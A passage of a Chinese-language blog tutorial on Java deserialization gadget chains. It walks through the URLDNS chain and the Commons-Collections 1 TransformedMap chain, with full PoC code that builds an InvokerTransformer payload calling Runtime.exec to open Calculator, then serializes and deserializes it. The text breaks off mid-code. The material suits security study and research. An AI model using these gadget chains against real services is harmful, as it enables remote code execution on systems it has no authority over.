了。</strong></p><p>继续跟，会到java.net.InetAddress#getAllByName()这个方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232113101.png" alt="image-20210511232113101" style="zoom:50%;"><p>进入getAllByName0:</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511232345462.png" alt="image-20210511232345462"></p><p><strong>总结一下到目前为止可以利用的调用链</strong>：</p><ol><li>HashMap.readObject() -&gt; HashMap.hash() </li><li>HashMap.hash() -&gt; URL.hashCode()</li><li>URL.hashCode() -&gt; URLStreamHandler.hashCode()</li><li>URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress()</li><li>URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName() -&gt; … -&gt; getAddressFromNameService()</li></ol><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>满足两个条件：</p><ol><li>为了能走到URL.hashCode()，要保证map里面存放着一个Entry，这个Entry的key满足URL类型</li><li>为了能走到URLStreamHandler.hashCode()，需要hashCode这个field为-1，绕过if判断</li></ol><p>往前翻PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">hashMap.put(url, <span class="string">"rmb122"</span>);</span><br><span class="line">f.set(url, -<span class="number">1</span>);</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>为什么这里首先给url的hashCode属性先设置成一个值，put到map之后，再改成另一个值？</strong></p><p>这里我们先做一件事，看一下之前提到的HashMap.readObject()方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000356313.png" alt="image-20210512000356313"></p><p>这里面的s其实是ObjectInputStream对象。既然key和value都是从s.readObejct()方法出来的(之后进行了cast强转)，那我们先看一下对应的HashMap.writeObject方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000617960.png" alt="image-20210512000617960" style="zoom:50%;"><p>跟到internalWriteEntries方法：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512000702874.png" alt="image-20210512000702874" style="zoom:50%;"><p>可以看到，分别对entry内部的key和value进行了writeObject，tab的值即HashMap中table的值，也就是横向数组。</p><p>想一下，如果你想向一个HashMap中存放一个entry，那么就要执行HashMap.put()方法：</p><p>再看一下HashMap的put方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210511224336952.png" alt="image-20210511224336952"></p><p>可以看到，这里用到了HashMap.hash()方法，如果这里面的key就是URL，那么后续利用链就能接上。</p><p>也就是说，<strong>仅仅一次put操作，就会触发一次DNS查询</strong>。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DNSTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(your_dns_url);</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">//此时就会产生一次dns查询</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就可以回答之前的问题：</p><p><strong>为什要改两次，因为我们要规避掉put操作产生的DNS查询。</strong></p><p>之后再改回-1，是为了可以成功触发反序列化时候的漏洞。</p><p>也就是这里还有一条小链：</p><blockquote><p>HashMap.put() -&gt; HashMap.hash() </p><p>HashMap.hash() -&gt; URL.hashCode()</p><p>…</p><p>触发DNS查询</p></blockquote><h2 id="ysoserial实现版本"><a href="#ysoserial实现版本" class="headerlink" title="ysoserial实现版本"></a>ysoserial实现版本</h2><p>十分优雅</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003551060.png" alt="image-20210512003551060"></p><p>这里首先有一个SilentURLStreamHandler对象，跟进去看看：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512003709417.png" alt="image-20210512003709417" style="zoom:50%;"><p>可以发现这个类其实就是继承URLStreamHandler类，并且把这两个方法改成了返回null，这样就规避了在生成payload的时候的那一次DNS查询，也就是我们之前看到的HashMap.put的那次操作。</p><p>这次put的时候，由于handler是SilentURLStreamHandler类，完全不会出发DNS解析，实在是妙。</p><h1 id="Commons-Collections"><a href="#Commons-Collections" class="headerlink" title="Commons-Collections"></a>Commons-Collections</h1><p>“不是夸你们Oracle呢，CC链确实让我们没饿死”</p><p>这里主要是ysoserial已经有的cc1-7漏洞，以及记录一些其他师傅们发现的。</p><p>cc的背景可以去看之前的<a href="https://0range228.github.io/%E3%80%90%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E3%80%91commons-collections-1%20%E7%BB%84%E4%BB%B6/" target="_blank" rel="noopener">文章</a>温习。</p><h2 id="cc1"><a href="#cc1" class="headerlink" title="cc1"></a>cc1</h2><p>条件：</p><ul><li><p><strong>cc3.1～3.2.1</strong></p></li><li><p><strong>jdk 1.7</strong>(8u71之前都可以)</p></li></ul><p>maven：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>预备知识：</p><ul><li><a href="https://0range228.github.io/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/" target="_blank" rel="noopener">动态代理</a>，一句话总结就是：<strong>动态代理直接调用接口的方法，无需实现类</strong>。</li><li><a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/" target="_blank" rel="noopener">反射</a></li></ul><p>主流两个版本：TransformedMap，LazyMap</p><h3 id="TransformedMap版本"><a href="#TransformedMap版本" class="headerlink" title="TransformedMap版本"></a>TransformedMap版本</h3><p>PoC：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonsCollections1_TransformedMap_Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.客户端构建攻击代码</span></span><br><span class="line">        <span class="comment">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;String.class, Class[].class &#125;, new Object[] &#123;"getRuntime", new Class[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("invoke", new Class[] &#123;Object.class, Object[].class &#125;, new Object[] &#123;null, new Object[]&#123;&#125; &#125;),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//将transformers数组存入ChaniedTransformer这个继承类</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建Map并绑定transformerChian</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line">        <span class="comment">//给予map数据转化链</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        <span class="comment">//反射机制调用AnnotationInvocationHandler类的构造函数</span></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        <span class="comment">//取消构造函数修饰符限制</span></span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类实例</span></span><br><span class="line">        Object instance = ctor.newInstance(Target<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//payload序列化写入文件，模拟网络传输</span></span><br><span class="line">        ObjectOutputStream fout = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        fout.writeObject(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.服务端读取文件，反序列化，模拟网络传输</span></span><br><span class="line">        ObjectInputStream fin = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(System.getProperty(<span class="string">"user.dir"</span>)+<span class="string">"/src/main/resources/Payload_cc1_transformedMap.ser"</span>)));</span><br><span class="line">        <span class="comment">//服务端反序列化，触发漏洞</span></span><br><span class="line">        fin.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其他小型触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Map map = <span class="keyword">new</span> HashedMap();</span><br><span class="line">Map transformedMap = TransformedMap.decorate(map,chainedTransformer,<span class="keyword">null</span>);</span><br><span class="line">map1.put(<span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="comment">//创建Map并绑定transformerChina</span></span><br><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">"value"</span>, <span class="string">"value"</span>);</span><br><span class="line"><span class="comment">//给予map数据转化链</span></span><br><span class="line">Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line"><span class="comment">//触发漏洞</span></span><br><span class="line">Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();</span><br><span class="line"><span class="comment">//outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式</span></span><br><span class="line">onlyElement.setValue(<span class="string">"foobar"</span>);</span><br></pre></td></tr></table></figure><h4 id="利用链寻找"><a href="#利用链寻找" class="headerlink" title="利用链寻找"></a>利用链寻找</h4><p>这里我想从漏洞挖掘的角度去写，毕竟这是个老洞，我们更应该关注的是如何找到的。</p><p>还是那句话，上来找readObject复写点，非常多！只不过我们现在关注TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512104425592.png" alt="image-20210512104425592" style="zoom:90%;"><p>翻看commons-collections的文档可以发现：</p><blockquote><p>该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换(transform)方法，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。</p></blockquote><blockquote><p>举个例子获得一个TransformedMap的实例，可以通过TransformedMap.decorate()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map tansformedMap = TransformedMap.decorate(map, keyTransformer, valueTransformer);</span><br></pre></td></tr></table></figure><p>可以看到三个参数，map，keyTransformer，valueTransformer</p></blockquote><p>翻译过来：<strong>当TransformedMap内的key或者value发生变化时，就会触发相应参数的Transformer的transform()方法。</strong></p><p>其实这句话值得引起我们的怀疑，<strong>transform参数是否可控</strong>？</p><p>索性去找Transformer类，发现是一个接口，只有一个transform方法，find implementation(option+cmd+B)，一共14个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105022662.png" alt="image-20210512105022662"></p><p>先看第一个，ChainedTransformer：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512113116168.png" alt="image-20210512113116168"></p><p>这里的iTransformer属性是一个Transformer[]数组，并且发现在ChainTransformer的transform函数中，会依次对该数组里面的transformer依次进行transform方法(不同的Transformer实现类实现的transform不同，多态)。</p><p>而且这里有一个细节就是：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object = <span class="keyword">this</span>.iTransformers[i].transform(object);</span><br></pre></td></tr></table></figure><p>这条语句放在了一个循环里面。</p><p>这也就<strong>导致上一次tranform方法的结果返回值会作为下一次transform的参数</strong>，越来越有链的感觉了！</p><p><strong>世界线展开</strong></p><p>这时候我们可以寻找invoke函数的调用点。</p><p>其实这里我认为我们始终离不开找invoke这样的sink点环节，碰巧发现在InvokeTransformer有invoke方法的使用：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105446730.png" alt="image-20210512105446730" style="zoom:90%;"><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512105544347.png" alt="image-20210512105544347"></p><p>哦这熟悉的反射味道，血压拉满！</p><p>如果这里input是可控的，按逻辑走，会获得input的Class对象，下一步想获取method对象，但是发现有两个参数iMethodName和iParamTypes。</p><p>往前翻构造函数：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512110405704.png" alt="image-20210512110405704"></p><p><strong>InvokerTransformer类就是今天的主角，因为他有RCE触发点。</strong></p><p>InvokerTransformer这部分我们先按下不表，接下来就要寻找哪些方法可以调用InvokerTransformer类呢？逃不开之前找到的14个Transformer，因为他们实现了Transformer这个接口，都现实了transform方法。</p><p>我们接下来要找transform方法在哪被调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512114920825.png" alt="image-20210512114920825"></p><p>看TransformedMap内部：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115236996.png" alt="image-20210512115236996"></p><p>只有这三处调用了transform方法。</p><p>前两个都是本类方法，但是第三个checkSetValue方法是一个抽象方法，属于AbstractInputCheckedMapDecorator的抽象方法，它一共有两个类实现，TransformedMap算一个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512115852020.png" alt="image-20210512115852020"></p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512120730684.png" alt="image-20210512120730684"></p><p>查找checkSetValue方法在哪可以被调用，发现在内部类MapEntry的setValue方法中调用了：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512134704165.png" alt="image-20210512134704165"></p><p>也就是说，<strong>只要一个类A继承了抽象类AbstractInputCheckedMapDecorator，那么A就会有内部类A.MapEntry，就可以A.MapEntry.setValue()执行方法。</strong></p><p><strong>我们的TransformedMap就是这样的一个A</strong></p><p>寻找实现AbstractInputCheckedMapDecorator的类，一共有4个：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512195129400.png" alt="image-20210512195129400"></p><p>正好TransformedMap算一个。所以它既是readObejct复写点又是执行链的起点</p><p><strong>世界线收束</strong></p><h4 id="构造PoC"><a href="#构造PoC" class="headerlink" title="构造PoC"></a>构造PoC</h4><p>经典一句话，弹计算器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">"open /Applications/Calculator.app"</span>);</span><br></pre></td></tr></table></figure><p>反射写法：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">"java.lang.Runtime"</span>); </span><br><span class="line">clazz.getMethod("exec", String.class).invoke(clazz.getMethod("getRuntime").invoke(clazz), "open /Applications/Calculator.app");</span><br></pre></td></tr></table></figure><p>不清楚的可以看之前的<a href="https://0range228.github.io/%E6%BC%AB%E8%B0%88Java%E5%8F%8D%E5%B0%84/" target="_blank" rel="noopener">博客</a></p><p>那现在要如何构造这句话呢？</p><p>首先上一部分我们发现了InvokerTransformer有invoke触发点，用反射来出发。</p><p>重要的是每个参数如何对应赋值，看InvokerTransformer的第二个构造方法：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142534887.png" alt="image-20210512142534887"></p><p>我们“一句话”到执行函数是exec，回去看看：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512142625801.png" alt="image-20210512142625801"></p><p>exec的参数类型是String，所以InvokerTransformer构造函数的三个参数分别是：</p><ul><li>methodName = “exec” =&gt; iMethodName</li><li>paramTypes = “new Class[]{String.class}” =&gt; iParamtypes</li><li>iArgs = “new String[]{“open /Applications/Calculator.app”}” =&gt; iArgs</li></ul><p>所以尝试写一个demo1.0：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InvokerTransformer it = <span class="keyword">new</span> InvokerTransformer(</span><br><span class="line">                <span class="string">"exec"</span>,</span><br><span class="line">                <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                new String[]&#123;"open /Applications/Calculator.app"&#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="comment">//得到Runtime.getRuntime()实例input</span></span><br><span class="line">        Object input = Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//为了能触发exec.invoke(input,"cmd"),需要执行transform方法</span></span><br><span class="line">        it.transform(input);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题来了，不会有人可以写好一个input在代码中等你，所以input需要写进payload。</p><p>所以接下来我们要去找：<strong>哪些类可以把input塞进去</strong>？</p><p>由于这里input依赖了反射，所以我们最好在jar包里找到一个invoke的复写点，直接全局搜invoke，发现只有InvokerTransformer自己。</p><p>所以这里<strong>我们需要将input拆开，为了依赖不同的组件</strong>。</p><p>想法就是既然你ChainedTransformer的transform可以<strong>循环调用</strong>Transformer数组内的不同tranform方法，那么我们也去找若干个Transformer来将input分别承担。</p><p>首先我们感觉肯定是越简单越好，最好是直接出现一个Transformer可以直接返回一个Runtime.getRuntime()</p><p>这样第二步直接new InvokerTransformer()就可以了：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">new InvokerTransformer("exec", new Class[] &#123;String.class &#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().invoke(method(exec),<span class="string">"open /Applications/Calculator.app"</span>)</span><br></pre></td></tr></table></figure><p>寻找Transformer的实现类14个：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150641804.png" alt="image-20210512150641804" style="zoom:80%;"><p>我们只想要一个Transformer帮我们承担Runtime.getRuntime()即可，其他最好什么都不做。</p><p>发现ConstantTransformer最合适：</p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512150729223.png" alt="image-20210512150729223" style="zoom:80%;"><p>完全都是简单的传递。</p><p>所以这时候demo2.0出现了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例</span></span><br><span class="line">                <span class="comment">// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        transformerChain.transform(<span class="keyword">null</span>);<span class="comment">//触发ChainedTransformer里面每一个人的transform</span></span><br></pre></td></tr></table></figure><p>但是这版本仅仅在本地可以测试，因为Runtime类没有实现Serializable接口，所以无法传输。</p><p>所以我们就需要反序列化那一端机器的Runtime实例。</p><p>继续拆分：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">  <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>)，//先得到<span class="title">Class</span>对象，<span class="title">Class</span>支持<span class="title">Serializable</span></span></span><br><span class="line">                new ConstantTransformer("getRuntime",new Class[]&#123;&#125;,new Object[]&#123;&#125;),//得到getRuntime方法对象</span><br><span class="line">                new InvokerTransformer("exec", new Class[] &#123;String.class&#125;, new Object[] &#123;"open /Applications/Calculator.app"&#125;)//将这个方法对象套在exec上</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>讲道理这样是可以的，但是实际上还是不行：</p><p>因为在InvokerTransformer的tranform中：</p><p><img src="../images/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%A1%A5%E5%85%A8%E8%AE%A1%E5%88%92/image-20210512153300247.png" alt="image-20210512153300247"></p><p>上来先input.getClass了，别忘了我们给的东西是Runtime.class，那结果肯定是Class对象java.lang.Class。</p><p>在java.lang.Class中寻找getRuntime对象肯定是找不到的。</p><p>所以这时候需要换一个思路：<strong>先拿到梯子，这里面的梯子就是getMethod方法</strong></p><p>目标语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">目标语句</span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>)</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">4</span>步走</span><br><span class="line"><span class="number">1</span>.先获得getMethod的方法对象，这个方法在java.lang.Class中</span><br><span class="line">Method gm = Class.forName("java.lang.Class").getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)</span><br><span class="line"><span class="number">2</span>.拿到之后，需要把getRuntime函数取出来。因为getMethod方法的作用就是返回一个method对象，所以直接invoke就行</span><br><span class="line">Method gr = gm.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[]&#123;&#125;);</span><br><span 